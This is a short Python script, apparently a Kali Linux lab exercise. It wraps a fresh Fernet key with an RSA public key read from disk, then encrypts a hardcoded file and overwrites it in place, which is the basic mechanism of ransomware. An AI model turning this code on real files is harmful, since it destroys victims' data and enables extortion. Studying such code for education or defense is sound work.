#importing libraries
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization   
from cryptography.hazmat.primitives.asymmetric import padding 
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

#creating a key and an encoder
symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)

#converting a key into an RSA public key object
with open ("/home/kali/Documents/key/public.key", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
    )

#we encrypt the symmetric key with the public RSA key and use OAEP
encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

#writing down the encrypted key
with open("encryptedSymmetricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)

#the path to the file to be encrypted
filePath = "/home/kali/Documents/FileToEncrypt.txt"

#we extract the text from the file and encrypt it
with open(filePath, "rb") as file:
    file_data = file.read()
    encrypted_data = FernetInstance.encrypt(file_data)

#changing the text to ciphertext
with open(filePath, "wb") as file:
    file.write(encrypted_data)
    
#exit
quit()
